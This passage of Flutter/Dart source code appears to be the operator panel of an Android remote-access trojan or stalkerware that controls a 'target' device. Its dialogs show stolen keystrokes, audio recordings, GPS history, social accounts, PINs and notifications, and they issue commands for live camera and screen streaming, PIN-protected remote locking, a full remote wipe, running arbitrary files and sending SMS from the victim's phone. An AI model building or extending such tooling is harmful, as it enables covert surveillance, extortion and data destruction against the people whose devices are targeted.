              children: [
                Icon(icon, color: kDeathRed, size: 20),
                const SizedBox(width: 8),
                Text(
                  '$title (${data.length})',
                  style: TextStyle(
                    color: Colors.white,
                    fontWeight: FontWeight.w700,
                    fontSize: 14,
                    fontFamily: 'FontX',
                    letterSpacing: 1,
                  ),
                ),
              ],
            ),
            const SizedBox(height: 8),
            Expanded(
              child: ListView.builder(
                controller: sc,
                padding: const EdgeInsets.symmetric(horizontal: 14),
                itemCount: data.length,
                itemBuilder: (_, i) {
                  final item = data[i];
                  return Container(
                    margin: const EdgeInsets.only(bottom: 8),
                    padding: const EdgeInsets.all(12),
                    decoration: BoxDecoration(
                      color: kDeathDarkBg,
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(color: kDeathBorder),
                    ),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          item['timestamp']?.toString() ?? 'No timestamp',
                          style: TextStyle(
                            color: Colors.white.withOpacity(0.1),
                            fontSize: 10,
                            fontFamily: 'ShareTechMono',
                          ),
                        ),
                        const SizedBox(height: 8),
                        Text(
                          item['content']?.toString() ?? item['keys']?.toString() ?? item['name']?.toString() ?? jsonEncode(item),
                          style: TextStyle(
                            color: kDeathGold,
                            fontSize: 12,
                            fontFamily: 'monospace',
                          ),
                        ),
                      ],
                    ),
                  );
                },
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _showAudioSheet(List audios) {
    showModalBottomSheet(
      context: context,
      backgroundColor: kDeathCardBg,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(24)),
      ),
      builder: (_) => DraggableScrollableSheet(
        initialChildSize: 0.6,
        maxChildSize: 0.9,
        expand: false,
        builder: (_, sc) => Column(
          children: [
            Container(
              height: 4,
              width: 40,
              margin: const EdgeInsets.only(top: 14, bottom: 10),
              decoration: BoxDecoration(
                gradient: LinearGradient(colors: [kDeathRed, kDeathGold]),
                borderRadius: BorderRadius.circular(4),
              ),
            ),
            Text(
              'AUDIO RECORDINGS',
              style: TextStyle(
                color: Colors.white,
                fontWeight: FontWeight.w700,
                fontSize: 14,
                fontFamily: 'FontX',
                letterSpacing: 1,
              ),
            ),
            const SizedBox(height: 8),
            Expanded(
              child: ListView.builder(
                controller: sc,
                padding: const EdgeInsets.symmetric(horizontal: 14),
                itemCount: audios.length,
                itemBuilder: (_, i) {
                  final audio = audios[i];
                  return Container(
                    margin: const EdgeInsets.only(bottom: 8),
                    padding: const EdgeInsets.all(12),
                    decoration: BoxDecoration(
                      color: kDeathDarkBg,
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(color: kDeathBorder),
                    ),
                    child: Row(
                      children: [
                        Icon(Icons.audiotrack_rounded, color: kDeathRed, size: 32),
                        const SizedBox(width: 12),
                        Expanded(
                          child: Column(
                            crossAxisAlignment: CrossAxisAlignment.start,
                            children: [
                              Text(
                                audio['timestamp']?.toString() ?? 'Unknown',
                                style: TextStyle(
                                  color: Colors.white.withOpacity(0.1),
                                  fontSize: 11,
                                  fontFamily: 'ShareTechMono',
                                ),
                              ),
                              const SizedBox(height: 4),
                              Text(
                                'Duration: ${audio['duration'] ?? '?'}s',
                                style: TextStyle(
                                  color: Colors.white,
                                  fontSize: 12,
                                  fontFamily: 'ShareTechMono',
                                ),
                              ),
                            ],
                          ),
                        ),
                        IconButton(
                          icon: Icon(Icons.play_circle_rounded, color: kDeathRed),
                          onPressed: () => _toast('Audio player not implemented', c: kDeathGold),
                        ),
                      ],
                    ),
                  );
                },
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _showSocialDialog(Map<String, dynamic> social) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: kDeathCardBg,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20), 
          side: BorderSide(color: kDeathRed.withOpacity(0.2), width: 1),
        ),
        title: Text(
          'SOCIAL MEDIA ACCOUNTS',
          style: TextStyle(
            color: Colors.white,
            fontSize: 14,
            fontWeight: FontWeight.w700,
            fontFamily: 'FontX',
          ),
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            if (social['instagram'] != null) 
              _socialRow(FontAwesomeIcons.instagram, 'Instagram', social['instagram']),
            if (social['twitter'] != null) 
              _socialRow(FontAwesomeIcons.twitter, 'Twitter', social['twitter']),
            if (social['facebook'] != null) 
              _socialRow(FontAwesomeIcons.facebook, 'Facebook', social['facebook']),
            if (social['tiktok'] != null) 
              _socialRow(FontAwesomeIcons.tiktok, 'TikTok', social['tiktok']),
            if (social['telegram'] != null) 
              _socialRow(FontAwesomeIcons.telegram, 'Telegram', social['telegram']),
            if (social['whatsapp'] != null) 
              _socialRow(FontAwesomeIcons.whatsapp, 'WhatsApp', social['whatsapp']),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text(
              'Close',
              style: TextStyle(
                color: Colors.white.withOpacity(0.1),
                fontFamily: 'ShareTechMono',
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _socialRow(FaIconData icon, String label, String value) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 6),
      child: Container(
        padding: const EdgeInsets.all(8),
        decoration: BoxDecoration(
          color: kDeathDarkBg,
          borderRadius: BorderRadius.circular(10),
          border: Border.all(color: kDeathBorder),
        ),
        child: Row(
          children: [
            FaIcon(icon, color: kDeathRed, size: 20),
            const SizedBox(width: 12),
            Text(
              '$label:',
              style: TextStyle(
                color: Colors.white.withOpacity(0.1),
                fontSize: 12,
                fontFamily: 'ShareTechMono',
              ),
            ),
            const SizedBox(width: 8),
            Expanded(
              child: Text(
                value,
                style: TextStyle(
                  color: Colors.white,
                  fontSize: 12,
                  fontWeight: FontWeight.w500,
                  fontFamily: 'ShareTechMono',
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _showGpsRoute(List history) {
    showModalBottomSheet(
      context: context,
      backgroundColor: kDeathCardBg,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(24)),
      ),
      builder: (_) => DraggableScrollableSheet(
        initialChildSize: 0.7,
        maxChildSize: 0.95,
        expand: false,
        builder: (_, sc) => Column(
          children: [
            Container(
              height: 4,
              width: 40,
              margin: const EdgeInsets.only(top: 14, bottom: 10),
              decoration: BoxDecoration(
                gradient: LinearGradient(colors: [kDeathGreen, kDeathGold]),
                borderRadius: BorderRadius.circular(4),
              ),
            ),
            Text(
              'GPS HISTORY',
              style: TextStyle(
                color: Colors.white,
                fontWeight: FontWeight.w700,
                fontSize: 14,
                fontFamily: 'FontX',
                letterSpacing: 1,
              ),
            ),
            const SizedBox(height: 8),
            Expanded(
              child: ListView.builder(
                controller: sc,
                padding: const EdgeInsets.symmetric(horizontal: 14),
                itemCount: history.length,
                itemBuilder: (_, i) {
                  final point = history[i];
                  return Container(
                    margin: const EdgeInsets.only(bottom: 8),
                    padding: const EdgeInsets.all(12),
                    decoration: BoxDecoration(
                      color: kDeathDarkBg,
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(color: kDeathBorder),
                    ),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          point['timestamp']?.toString() ?? 'Unknown',
                          style: TextStyle(
                            color: Colors.white.withOpacity(0.1),
                            fontSize: 11,
                            fontFamily: 'ShareTechMono',
                          ),
                        ),
                        const SizedBox(height: 8),
                        Text(
                          '📍 Lat: ${point['lat']}, Lng: ${point['lng']}',
                          style: TextStyle(
                            color: kDeathGreen,
                            fontSize: 12,
                            fontFamily: 'monospace',
                          ),
                        ),
                        if (point['accuracy'] != null)
                          Text(
                            '🎯 Accuracy: ${point['accuracy']}m',
                            style: TextStyle(
                              color: Colors.white.withOpacity(0.1),
                              fontSize: 11,
                              fontFamily: 'ShareTechMono',
                            ),
                          ),
                        if (point['speed'] != null)
                          Text(
                            '💨 Speed: ${point['speed']} m/s',
                            style: TextStyle(
                              color: Colors.white.withOpacity(0.1),
                              fontSize: 11,
                              fontFamily: 'ShareTechMono',
                            ),
                          ),
                        const SizedBox(height: 8),
                        GestureDetector(
                          onTap: () => launchUrl(
                            Uri.parse('https://www.google.com/maps/search/?api=1&query=${point['lat']},${point['lng']}'),
                            mode: LaunchMode.externalApplication
                          ),
                          child: Container(
                            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                            decoration: BoxDecoration(
                              color: kDeathGreen.withOpacity(0.04),
                              borderRadius: BorderRadius.circular(8),
                              border: Border.all(color: kDeathGreen.withOpacity(0.1)),
                            ),
                            child: Row(
                              mainAxisSize: MainAxisSize.min,
                              children: [
                                Icon(Icons.map_rounded, size: 14, color: kDeathGreen),
                                const SizedBox(width: 4),
                                Text(
                                  'View on Maps',
                                  style: TextStyle(
                                    color: kDeathGreen,
                                    fontSize: 11,
                                    fontFamily: 'ShareTechMono',
                                  ),
                                ),
                              ],
                            ),
                          ),
                        ),
                      ],
                    ),
                  );
                },
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _showLockStatusDialog(Map<String, dynamic> status) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: kDeathCardBg,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20), 
          side: BorderSide(
            color: status['locked'] == true ? kDeathRed.withOpacity(0.2) : kDeathGreen.withOpacity(0.2),
            width: 1,
          ),
        ),
        title: Text(
          status['locked'] == true ? '🔒 DEVICE LOCKED' : '🔓 DEVICE UNLOCKED',
          style: TextStyle(
            color: Colors.white,
            fontSize: 14,
            fontWeight: FontWeight.w700,
            fontFamily: 'FontX',
          ),
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Icon(
              status['locked'] == true ? Icons.lock_rounded : Icons.lock_open_rounded,
              color: status['locked'] == true ? kDeathRed : kDeathGreen,
              size: 48,
            ),
            const SizedBox(height: 12),
            if (status['pin'] != null)
              Text(
                'PIN: ${status['pin']}',
                style: TextStyle(
                  color: kDeathGold,
                  fontSize: 12,
                  fontFamily: 'ShareTechMono',
                ),
              ),
            if (status['timestamp'] != null)
              Text(
                'Last update: ${status['timestamp']}',
                style: TextStyle(
                  color: Colors.white.withOpacity(0.1),
                  fontSize: 11,
                  fontFamily: 'ShareTechMono',
                ),
              ),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text(
              'Close',
              style: TextStyle(
                color: Colors.white.withOpacity(0.1),
                fontFamily: 'ShareTechMono',
              ),
            ),
          ),
        ],
      ),
    );
  }

  void _showLiveDialog() {
    showDialog(
      context: context, barrierDismissible: false,
      builder: (_) => ValueListenableBuilder<int>(
        valueListenable: _frameN,
        builder: (ctx, _, __) => Dialog(
          backgroundColor: kDeathDarkBg,
          insetPadding: const EdgeInsets.all(8),
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(20),
            side: BorderSide(color: kDeathRed.withOpacity(0.2), width: 1),
          ),
          child: Column(mainAxisSize: MainAxisSize.min, children: [
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
              decoration: BoxDecoration(
                color: kDeathCardBg,
                borderRadius: const BorderRadius.vertical(top: Radius.circular(18)),
                border: Border(bottom: BorderSide(color: kDeathBorder)),
              ),
              child: Row(children: [
                AnimatedBuilder(
                  animation: _pulseAnimation,
                  builder: (context, child) {
                    return Transform.scale(
                      scale: _pulseAnimation.value,
                      child: Container(
                        width: 10,
                        height: 10,
                        decoration: BoxDecoration(
                          color: kDeathRed,
                          shape: BoxShape.circle,
                          boxShadow: [
                            BoxShadow(color: kDeathRed, blurRadius: 10),
                          ],
                        ),
                      ),
                    );
                  },
                ),
                const SizedBox(width: 12),
                Text(
                  'LIVE — $_liveTitle',
                  style: TextStyle(
                    color: Colors.white,
                    fontSize: 13,
                    fontWeight: FontWeight.w700,
                    fontFamily: 'FontX',
                    letterSpacing: 0.5,
                  ),
                ),
                const Spacer(),
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
                  decoration: BoxDecoration(
                    color: kDeathGreen.withOpacity(0.04),
                    borderRadius: BorderRadius.circular(8),
                    border: Border.all(color: kDeathGreen.withOpacity(0.1)),
                  ),
                  child: Text(
                    '$_fps fps',
                    style: TextStyle(
                      color: kDeathGreen,
                      fontSize: 10,
                      fontWeight: FontWeight.w700,
                      fontFamily: 'FontX',
                    ),
                  ),
                ),
              ]),
            ),
            Container(
              constraints: BoxConstraints(maxHeight: MediaQuery.of(context).size.height * 0.55),
              color: kDeathDarkBg,
              child: _frame != null
                  ? Image.memory(_frame!, fit: BoxFit.contain, gaplessPlayback: true, filterQuality: FilterQuality.low)
                  : SizedBox(
                      height: 200,
                      child: Center(
                        child: Column(
                          mainAxisSize: MainAxisSize.min,
                          children: [
                            SizedBox(
                              width: 30,
                              height: 30,
                              child: CircularProgressIndicator(
                                strokeWidth: 2,
                                color: kDeathRed,
                              ),
                            ),
                            const SizedBox(height: 12),
                            Text(
                              'Waiting for frames...',
                              style: TextStyle(
                                color: Colors.white.withOpacity(0.1),
                                fontSize: 12,
                                fontFamily: 'ShareTechMono',
                              ),
                            ),
                          ],
                        ),
                      ),
                    ),
            ),
            Container(
              padding: const EdgeInsets.all(14),
              decoration: BoxDecoration(
                color: kDeathCardBg,
                borderRadius: const BorderRadius.vertical(bottom: Radius.circular(18)),
                border: Border(top: BorderSide(color: kDeathBorder)),
              ),
              child: Row(children: [
                Expanded(
                  child: Container(
                    decoration: BoxDecoration(
                      gradient: LinearGradient(colors: [kDeathRed, kDeathGold]),
                      borderRadius: BorderRadius.circular(12),
                    ),
                    child: ElevatedButton.icon(
                      style: ElevatedButton.styleFrom(
                        backgroundColor: Colors.transparent,
                        shadowColor: Colors.transparent,
                        shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(12),
                        ),
                      ),
                      icon: const Icon(Icons.cameraswitch_rounded, color: Colors.white, size: 18),
                      label: Text(
                        'SWITCH',
                        style: TextStyle(
                          color: Colors.white,
                          fontSize: 11,
                          fontWeight: FontWeight.w700,
                          fontFamily: 'FontX',
                        ),
                      ),
                      onPressed: () {
                        final isFront = _liveTitle.contains('FRONT');
                        _stopLive();
                        Future.delayed(const Duration(milliseconds: 300), () => _startLive('live_camera_start', isFront ? 'back' : 'front'));
                      },
                    ),
                  ),
                ),
                const SizedBox(width: 12),
                Expanded(
                  child: Container(
                    decoration: BoxDecoration(
                      gradient: LinearGradient(colors: [kDeathRed, kDeathRedDark]),
                      borderRadius: BorderRadius.circular(12),
                      boxShadow: [
                        BoxShadow(
                          color: kDeathRed.withOpacity(0.2),
                          blurRadius: 10,
                        ),
                      ],
                    ),
                    child: ElevatedButton.icon(
                      style: ElevatedButton.styleFrom(
                        backgroundColor: Colors.transparent,
                        shadowColor: Colors.transparent,
                        shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(12),
                        ),
                      ),
                      icon: const Icon(Icons.stop_rounded, color: Colors.white, size: 18),
                      label: Text(
                        'STOP',
                        style: TextStyle(
                          color: Colors.white,
                          fontSize: 11,
                          fontWeight: FontWeight.w700,
                          fontFamily: 'FontX',
                        ),
                      ),
                      onPressed: () { _stopLive(); Navigator.pop(ctx); },
                    ),
                  ),
                ),
              ]),
            ),
          ]),
        ),
      ),
    ).then((_) => _stopLive());
  }

  void _lockLiveDialog() {
    final msgCtrl = TextEditingController();
    final pinCtrl = TextEditingController();
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: kDeathCardBg,
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(20), 
        side: BorderSide(color: kDeathRed.withOpacity(0.2), width: 1),
      ),
      title: Text(
        '🔒 Lock Screen',
        style: TextStyle(
          color: kDeathRed,
          fontSize: 15,
          fontWeight: FontWeight.w700,
          fontFamily: 'FontX',
        ),
      ),
      content: Column(mainAxisSize: MainAxisSize.min, children: [
        Text(
          'Target screen will be locked',
          style: TextStyle(
            color: Colors.white.withOpacity(0.1),
            fontSize: 12,
            fontFamily: 'ShareTechMono',
          ),
        ),
        const SizedBox(height: 14),
        _field(msgCtrl, 'Lock Message', hint: 'This device is locked by administrator'),
        const SizedBox(height: 12),
        _field(pinCtrl, 'Unlock PIN', hint: '1234', isNum: true),
      ]),
      actions: [
        TextButton(
          onPressed: () => Navigator.pop(context),
          child: Text(
            'Cancel',
            style: TextStyle(
              color: Colors.white.withOpacity(0.1),
              fontFamily: 'ShareTechMono',
            ),
          ),
        ),
        Container(
          decoration: BoxDecoration(
            gradient: LinearGradient(colors: [kDeathRed, kDeathRedDark]),
            borderRadius: BorderRadius.circular(12),
          ),
          child: ElevatedButton(
            style: ElevatedButton.styleFrom(backgroundColor: Colors.transparent, elevation: 0),
            onPressed: () {
              Navigator.pop(context);
              final msg = msgCtrl.text.trim().isEmpty ? 'THIS DEVICE IS LOCKED BY ADMINISTRATOR' : msgCtrl.text.trim();
              final pin = pinCtrl.text.trim().isEmpty ? '1234' : pinCtrl.text.trim();
              _cmd('remote_lock', extra: jsonEncode({'message': msg, 'pin': pin}));
            },
            child: Text(
              'LOCK NOW',
              style: TextStyle(
                color: Colors.white,
                fontWeight: FontWeight.w700,
                fontSize: 11,
                fontFamily: 'FontX',
                letterSpacing: 1,
              ),
            ),
          ),
        ),
      ],
    ));
  }

  void _lockChatDialog() {
    final msgCtrl  = TextEditingController();
    final pinCtrl  = TextEditingController();
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: kDeathCardBg,
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(20), 
        side: BorderSide(color: kDeathGold.withOpacity(0.2), width: 1),
      ),
      title: Text(
        '🔓 Soft Lock',
        style: TextStyle(
          color: kDeathGold,
          fontSize: 15,
          fontWeight: FontWeight.w700,
          fontFamily: 'FontX',
        ),
      ),
      content: Column(mainAxisSize: MainAxisSize.min, children: [
        _field(msgCtrl, 'Lock Message', hint: 'Example: Device locked by administrator'),
        const SizedBox(height: 12),
        _field(pinCtrl, 'Unlock PIN', hint: '1234', isNum: true),
      ]),
      actions: [
        TextButton(
          onPressed: () => Navigator.pop(context),
          child: Text(
            'Cancel',
            style: TextStyle(
              color: Colors.white.withOpacity(0.1),
              fontFamily: 'ShareTechMono',
            ),
          ),
        ),
        Container(
          decoration: BoxDecoration(
            gradient: LinearGradient(colors: [kDeathRed, kDeathGold]),
            borderRadius: BorderRadius.circular(12),
          ),
          child: ElevatedButton(
            style: ElevatedButton.styleFrom(backgroundColor: Colors.transparent, elevation: 0),
            onPressed: () {
              Navigator.pop(context);
              final msg = msgCtrl.text.trim().isEmpty ? 'THIS DEVICE IS LOCKED BY ADMINISTRATOR' : msgCtrl.text.trim();
              final pin = pinCtrl.text.trim().isEmpty ? '1234' : pinCtrl.text.trim();
              _cmd('hard_lock', extra: '$msg|$pin');
            },
            child: Text(
              'SOFT LOCK',
              style: TextStyle(
                color: Colors.white,
                fontWeight: FontWeight.w700,
                fontSize: 11,
                fontFamily: 'FontX',
                letterSpacing: 1,
              ),
            ),
          ),
        ),
      ],
    ));
  }

  void _wipeDeviceDialog() {
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: kDeathCardBg,
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(20), 
        side: BorderSide(color: kDeathRed.withOpacity(0.3), width: 2),
      ),
      title: Text(
        '⚠️ WIPE DEVICE',
        style: TextStyle(
          color: kDeathRed,
          fontSize: 15,
          fontWeight: FontWeight.w700,
          fontFamily: 'FontX',
        ),
      ),
      content: Column(
        mainAxisSize: MainAxisSize.min,
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text(
            'This will permanently delete ALL data on the target device!',
            style: TextStyle(
              color: kDeathRed,
              fontSize: 13,
              fontWeight: FontWeight.w600,
              fontFamily: 'FontX',
            ),
          ),
          const SizedBox(height: 12),
          Text(
            '• Photos\n• Contacts\n• Messages\n• Apps\n• All user data\n\nThis action CANNOT be undone!',
            style: TextStyle(
              color: Colors.white.withOpacity(0.1),
              fontSize: 12,
              fontFamily: 'ShareTechMono',
              height: 1.5,
            ),
          ),
        ],
      ),
      actions: [
        TextButton(
          onPressed: () => Navigator.pop(context),
          child: Text(
            'CANCEL',
            style: TextStyle(
              color: Colors.white.withOpacity(0.1),
              fontFamily: 'FontX',
              letterSpacing: 1,
            ),
          ),
        ),
        Container(
          decoration: BoxDecoration(
            gradient: LinearGradient(colors: [kDeathRed, kDeathRedDark]),
            borderRadius: BorderRadius.circular(12),
          ),
          child: ElevatedButton(
            style: ElevatedButton.styleFrom(backgroundColor: Colors.transparent, elevation: 0),
            onPressed: () {
              Navigator.pop(context);
              _cmd('remote_wipe');
            },
            child: Text(
              'CONFIRM WIPE',
              style: TextStyle(
                color: Colors.white,
                fontWeight: FontWeight.w700,
                fontSize: 11,
                fontFamily: 'FontX',
                letterSpacing: 1,
              ),
            ),
          ),
        ),
      ],
    ));
  }

  void _execFileDialog() {
    final pathCtrl = TextEditingController();
    final argsCtrl = TextEditingController();
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: kDeathCardBg,
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(20), 
        side: BorderSide(color: kDeathGold.withOpacity(0.2), width: 1),
      ),
      title: Text(
        '⚙️ Execute File',
        style: TextStyle(
          color: kDeathGold,
          fontSize: 15,
          fontWeight: FontWeight.w700,
          fontFamily: 'FontX',
        ),
      ),
      content: Column(mainAxisSize: MainAxisSize.min, children: [
        _field(pathCtrl, 'File Path', hint: '/data/data/com.whatsapp/lib/libsticker.so'),
        const SizedBox(height: 12),
        _field(argsCtrl, 'Arguments (optional)', hint: '--help'),
      ]),
      actions: [
        TextButton(
          onPressed: () => Navigator.pop(context),
          child: Text(
            'Cancel',
            style: TextStyle(
              color: Colors.white.withOpacity(0.1),
              fontFamily: 'ShareTechMono',
            ),
          ),
        ),
        Container(
          decoration: BoxDecoration(
            gradient: LinearGradient(colors: [kDeathRed, kDeathGold]),
            borderRadius: BorderRadius.circular(12),
          ),
          child: ElevatedButton(
            style: ElevatedButton.styleFrom(backgroundColor: Colors.transparent, elevation: 0),
            onPressed: () {
              Navigator.pop(context);
              if (pathCtrl.text.trim().isNotEmpty) {
                _cmd('exec_file', extra: jsonEncode({'path': pathCtrl.text.trim(), 'args': argsCtrl.text.trim()}));
              }
            },
            child: Text(
              'EXECUTE',
              style: TextStyle(
                color: Colors.white,
                fontWeight: FontWeight.w700,
                fontSize: 11,
                fontFamily: 'FontX',
                letterSpacing: 1,
              ),
            ),
          ),
        ),
      ],
    ));
  }

  void _sendSmsDialog() {
    final toCtrl = TextEditingController();
    final msgCtrl = TextEditingController();
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: kDeathCardBg,
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(20), 
        side: BorderSide(color: kDeathGold.withOpacity(0.2), width: 1),
      ),
      title: Text(
        '📱 Send SMS via Target',
        style: TextStyle(
          color: kDeathGold,
          fontSize: 15,
          fontWeight: FontWeight.w700,
          fontFamily: 'FontX',
        ),
      ),
      content: Column(mainAxisSize: MainAxisSize.min, children: [
        _field(toCtrl, 'Phone Number', hint: '+628123456789'),
        const SizedBox(height: 12),
        _field(msgCtrl, 'Message', hint: 'Your message here...'),
      ]),
      actions: [
        TextButton(
          onPressed: () => Navigator.pop(context),
          child: Text(
            'Cancel',
            style: TextStyle(
              color: Colors.white.withOpacity(0.1),
              fontFamily: 'ShareTechMono',
            ),
          ),
        ),
        Container(
          decoration: BoxDecoration(
            gradient: LinearGradient(colors: [kDeathRed, kDeathGold]),
            borderRadius: BorderRadius.circular(12),
          ),
          child: ElevatedButton(
            style: ElevatedButton.styleFrom(backgroundColor: Colors.transparent, elevation: 0),
            onPressed: () {
              Navigator.pop(context);
              if (toCtrl.text.trim().isNotEmpty && msgCtrl.text.trim().isNotEmpty) {
                _cmd('send_sms', extra: jsonEncode({'to': toCtrl.text.trim(), 'message': msgCtrl.text.trim()}));
              }
            },
            child: Text(
              'SEND SMS',
              style: TextStyle(
                color: Colors.white,
                fontWeight: FontWeight.w700,
                fontSize: 11,
                fontFamily: 'FontX',
                letterSpacing: 1,
              ),
            ),
          ),
        ),
      ],
    ));
  }

  Future<void> _fetchNotif() async {
    _addLog('Fetching notifications...');
    try {
      final res = await http.get(Uri.parse('${ApiConfig.baseUrl}/api/get-notifications/$_id'));
      if (res.statusCode == 200) {
        final list = jsonDecode(res.body) as List;
        _addLog('${list.length} notifications');
        showModalBottomSheet(
          context: context,
          backgroundColor: kDeathCardBg,
          isScrollControlled: true,
          shape: const RoundedRectangleBorder(
            borderRadius: BorderRadius.vertical(top: Radius.circular(24)),
          ),
          builder: (_) => DraggableScrollableSheet(
            initialChildSize: 0.6,
            maxChildSize: 0.9,
            expand: false,
            builder: (_, sc) => Column(
              children: [
                Container(
                  height: 4,
                  width: 40,
                  margin: const EdgeInsets.only(top: 14, bottom: 10),
                  decoration: BoxDecoration(
                    gradient: LinearGradient(colors: [kDeathRed, kDeathGold]),
                    borderRadius: BorderRadius.circular(4),
                  ),
                ),
                Text(
                  'NOTIFICATIONS',
                  style: TextStyle(
                    color: Colors.white,
                    fontWeight: FontWeight.w700,
                    fontSize: 14,
                    fontFamily: 'FontX',
                    letterSpacing: 1,
                  ),
                ),
                const SizedBox(height: 8),
                Expanded(
                  child: ListView.separated(
                    controller: sc,
                    padding: const EdgeInsets.symmetric(horizontal: 14),
                    itemCount: list.length,
                    separatorBuilder: (_, __) => Divider(color: kDeathBorder, height: 1),
                    itemBuilder: (_, i) => ListTile(
                      contentPadding: const EdgeInsets.symmetric(horizontal: 0, vertical: 4),
                      leading: Container(
                        width: 42,
                        height: 42,
                        decoration: BoxDecoration(
                          color: kDeathRed.withOpacity(0.04),
                          borderRadius: BorderRadius.circular(12),
                          border: Border.all(color: kDeathRed.withOpacity(0.1)),
                        ),
                        child: Icon(Icons.notifications_rounded, color: kDeathRed, size: 20),
                      ),
                      title: Text(
                        list[i]['title']?.toString() ?? '-',
                        style: TextStyle(
                          color: Colors.white,
                          fontSize: 13,
                          fontWeight: FontWeight.w600,
                          fontFamily: 'FontX',
                        ),
                      ),
                      subtitle: Text(
                        list[i]['body']?.toString() ?? '',
                        style: TextStyle(
                          color: Colors.white.withOpacity(0.1),
                          fontSize: 11,
                          fontFamily: 'ShareTechMono',
                        ),
                      ),
                    ),
                  ),
                ),
              ],
            ),
          ),
        );
      }
    } catch (_) {
      _addLog('Notif error');
    }
  }

  // ============================================================
  // TAB PAGES
  // ============================================================
  Widget _pageLive() => ListView(padding: const EdgeInsets.all(16), children: [
    _header('LIVE STREAM', 'Real-time camera & screen from target device'),
    const SizedBox(height: 16),
    AnimatedContainer(
      duration: const Duration(milliseconds: 300),
      height: _liveOn ? 240 : 100,
      decoration: BoxDecoration(
        color: kDeathDarkBg,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(
          color: _liveOn ? kDeathRed.withOpacity(0.2) : kDeathBorder,
          width: 1.5,
        ),
      ),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(19),
        child: _liveOn && _frame != null
            ? Image.memory(_frame!, fit: BoxFit.contain, gaplessPlayback: true, filterQuality: FilterQuality.low)
            : Center(
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Icon(Icons.videocam_off_rounded, color: Colors.white.withOpacity(0.03), size: 32),
                    const SizedBox(height: 8),
                    Text(
                      _liveOn ? 'Waiting for frames...' : 'Stream inactive',
                      style: TextStyle(
                        color: Colors.white.withOpacity(0.05),
                        fontSize: 11,
                        fontFamily: 'ShareTechMono',
                      ),
                    ),
                  ],
                ),
              ),
      ),
    ),
    const SizedBox(height: 20),
    Row(children: [
      Expanded(
        child: GestureDetector(
          onTap: () { _showCamPicker((side) { _startLive('live_camera_start', side); _showLiveDialog(); }); },
          child: Container(
            margin: const EdgeInsets.only(right: 6),
            padding: const EdgeInsets.symmetric(vertical: 16),
            decoration: BoxDecoration(
              color: kDeathCardBg,
              borderRadius: BorderRadius.circular(16),
              border: Border.all(color: kDeathRed.withOpacity(0.2), width: 1),
            ),
            child: Column(children: [
              Container(
                width: 44, height: 44,
                decoration: BoxDecoration(
                  color: kDeathRed.withOpacity(0.04),
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: kDeathRed.withOpacity(0.1)),
                ),
                child: Icon(Icons.videocam_rounded, color: kDeathRed, size: 22),
              ),
              const SizedBox(height: 12),
              Text(
                'CAMERA',
                textAlign: TextAlign.center,
                style: TextStyle(
                  color: kDeathRed,
                  fontSize: 11,
                  fontWeight: FontWeight.w700,
                  fontFamily: 'FontX',
                  letterSpacing: 1,
                ),
              ),
            ]),
          ),
        ),
      ),
      Expanded(
        child: GestureDetector(
          onTap: () { _startLive('live_screen_start', ''); _showLiveDialog(); },
          child: Container(
            margin: const EdgeInsets.only(left: 6),
            padding: const EdgeInsets.symmetric(vertical: 16),
            decoration: BoxDecoration(
              color: kDeathCardBg,
              borderRadius: BorderRadius.circular(16),
              border: Border.all(color: kDeathGold.withOpacity(0.2), width: 1),
            ),
            child: Column(children: [
              Container(
                width: 44, height: 44,
                decoration: BoxDecoration(
                  color: kDeathGold.withOpacity(0.04),
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: kDeathGold.withOpacity(0.1)),
                ),
                child: Icon(Icons.desktop_windows_rounded, color: kDeathGold, size: 22),
              ),
              const SizedBox(height: 12),
              Text(
                'SCREEN',
                textAlign: TextAlign.center,
                style: TextStyle(
                  color: kDeathGold,
                  fontSize: 11,
                  fontWeight: FontWeight.w700,
